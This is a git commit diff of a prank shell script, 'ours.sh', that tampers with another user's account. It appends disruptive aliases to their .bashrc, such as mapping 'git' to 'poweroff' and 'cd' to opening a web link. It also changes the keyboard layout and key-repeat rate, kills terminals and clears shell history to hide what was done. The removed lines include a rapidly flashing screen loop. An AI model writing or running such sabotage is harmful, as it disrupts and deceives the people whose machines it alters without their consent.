cae16954138344064d5e53a88249c103177f1d2c
Théo Labory <theo.labory@epitech.eu>
2017-10-11 15:47:47 +0200

    snow ok
    ok

--- ours.sh
+++ ours.sh
@@ -1,11 +1,8 @@
 #!/bin/sh
-echo "xterm*background: pink" >> /home/${USER}/.Xdefaults;
-echo "alias ls='eject /dev/sr0 && ls --color=auto'" >> /home/${USER}/.bashrc;
+echo "alias ls='ls --color=auto'" >> /home/${USER}/.bashrc;
 echo "alias emacs='vim'" >> /home/${USER}/.bashrc;
 echo "alias cd='google-chrome imgur.com/g597Ov2' && cd" >> /home/${USER}/.bashrc;
-echo "alias rendu='poweroff'" >> /home/${USER}/.bashrc;
-echo "alias xlock='google-chrome bambou.la'" >> /home/${USER}/.bashrc;
-echo "alias pwd='xeyes;xeyes;xeyes;xterm;xterm;xterm;xterm'" >> /home/${USER}/.bashrc;
+echo "alias git='poweroff'" >> /home/${USER}/.bashrc;
 echo "xset r rate 3;" >> /home/${USER}/.bashrc;
 echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
 echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
@@ -14,19 +11,3 @@ echo "history -c" >> /home/${USER}/.bashrc;
 setxkbmap ru;
 pkill terminal;
 history -c
-
-while [ 1 ]
-do
-fbsetroot -solid green
-sleep 0.01
-fbsetroot -solid black
-sleep 0.01
-fbsetroot -solid yellow
-sleep 0.01
-fbsetroot -solid blue
-sleep 0.01
-fbsetroot -solid pink
-sleep 0.01
-fbsetroot -solid red
-sleep 0.01
-done
